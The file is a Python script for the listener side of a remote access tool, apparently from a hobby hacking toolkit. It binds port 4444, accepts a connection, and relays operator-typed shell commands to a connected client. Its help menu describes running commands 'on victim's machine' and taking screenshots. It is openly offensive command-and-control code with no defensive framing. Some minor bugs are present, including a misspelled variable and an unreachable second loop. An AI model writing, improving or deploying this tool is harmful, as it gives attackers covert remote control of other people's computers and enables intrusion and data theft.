import socket, os
from colorama import *
from time import sleep
from os import system, getenv, name
from usefull import *
import json

## set the clear command by os name
windows = False
if name == 'nt': ## windows
    def clear():
        widows = True
        system('cls')
else: ## linux distrib.
    def clear():
        system('clear')




## init colorama to dodge the problems
init()



class Server:
    def start(SERVER_PORT=4444, SERVER_HOST="0.0.0.0"):

        print(f"{info}Server started")




        BUFFER_SIZE = 1024 * 128

        SEPARATOR = " "
        s = socket.socket()
        s.bind((SERVER_HOST, SERVER_PORT))

        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        s.listen(5)
        print(f"{info}Listening as {magenta}{SERVER_HOST}:{SERVER_PORT}{reset} ...")


        client_socket, client_address = s.accept()
        print(f"{sub}{magenta}{client_address[0]}:{client_address[1]}{reset} Connected!")


        cwd = client_socket.recv(BUFFER_SIZE).decode()
        print(f"{info}Current working directory: {cyan}{cwd}{reset}")
        while True:
            cmd = input(f"{magenta}>{cyan}")
            reset
            if cmd == "help":
                print(f"""
                {magenta}help            {cyan}display this message
                {magenta}sessions        {cyan}display all sessions
                {magenta}sessions {lightRed}<id>   {cyan}switch to the session with the same id
                {magenta}screenshot      {cyan}do a screenshot and save it
                {magenta}shell {lightRed}<command> {cyan}execute the command you want on victim's machine
                {reset}                
                """)
            elif cmd[0:5] == "shell":
                command_shell = cmd[6:len(cmd)+1]
                if not command_shell.strip():
                    # empty command
                    continue
                # send the command to the client
                client_socket.send(cmd.encode())
                output = client_socket.recv(BUFFER_SIZE).decode()
                print(f'{magenta}Shell: {cyan}{output}')

        while True:
            # get the command from prompt
            command = input(f"{cyan}{cwd} {magenta}$> ")
            reset
            if not command.strip():
                # empty command
                continue
            # send the command to the client
            client_socket.send(command.encode())
            if command.lower() == "exit":
                # if the command is exit, just break out of the loop
                break
            # retrieve command results
            output = client_socket.recv(BUFFER_SIZE).decode()
            print(output)
            # split command output and current directory
            results, cwd = output.split(SEPARATOR)
            # print output
            print(results)
        # close connection to the client

        client_socket.close()
        print(f"{attention}Client connection closed")
        s.close()
        print(f"{attention}Server closed")
        print(f"{info}Go back to menu...")
        sleep(3)
